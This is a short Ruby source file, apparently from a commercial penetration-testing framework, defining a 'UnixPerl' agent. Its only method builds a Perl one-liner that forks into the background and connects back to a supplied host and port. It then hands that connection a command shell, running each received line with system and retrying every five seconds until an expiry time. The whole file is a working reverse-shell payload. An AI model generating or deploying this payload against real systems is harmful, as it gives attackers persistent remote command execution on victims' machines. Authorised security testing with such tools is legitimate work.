module Pro
module Agent
class UnixPerl < BaseAgent
	def self.generate(framework, host, port, opts={})
		expire_time = opts[:expire_time] || ::Time.at(::Time.now.to_i + ( 3600 * 24 )).utc.to_i
		"perl -MIO -e '$p=fork;exit,if($p);while(time()<=#{expire_time}){$c=new IO::Socket::INET(PeerAddr,\"#{host}:#{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;sleep(5)}'"
	end
end
end
end

